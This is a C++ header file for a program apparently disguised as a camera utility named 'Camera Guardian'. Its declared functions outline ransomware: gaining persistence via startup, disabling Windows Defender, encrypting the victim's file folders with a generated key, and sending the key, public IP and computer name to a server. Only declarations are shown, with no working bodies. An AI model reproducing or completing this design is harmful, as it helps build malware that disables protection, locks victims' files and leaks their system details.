#pragma once



#include <string>
#include <windows.h>
#include <shlobj.h>
#include <atlbase.h>
#include <atlsecurity.h>
#include <shobjidl.h>
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <wininet.h>
#include <winsock.h>
#include <experimental/filesystem>


#define APP_NAME "Camera Guardian"
#define MAX_RANDOM_NUMBER 1000
#define MIN_RANDOM_NUMBER 100
#define SERVER_ADDRESS "127.0.0.1" // local host
#define SERVER_PORT 8080 // default port for HTTP server

bool IsAdministrator(HRESULT& rHr);
bool add_to_startup(const std::string& exe_path);
std::string get_this_file_path();
bool open_camera_app();
bool disable_defender();
std::string get_file_folder(std::string file_path);
int get_encryption_key();
bool send_data_to_server(SOCKET clientSocket, int key, std::string public_ip);
std::string fetch_ip_address();
std::string fetch_computer_name();
SOCKET cnnect_to_server();
std::string conccet_ip_and_computer_name(size_t public_key);
bool encrypt_file_folders(int key, std::string folder_path);
bool check_for_exe_file(std::string file_name);
bool get_file_folders(int key, std::string folder_path, std::string start);
bool find_folder(std::string file_name);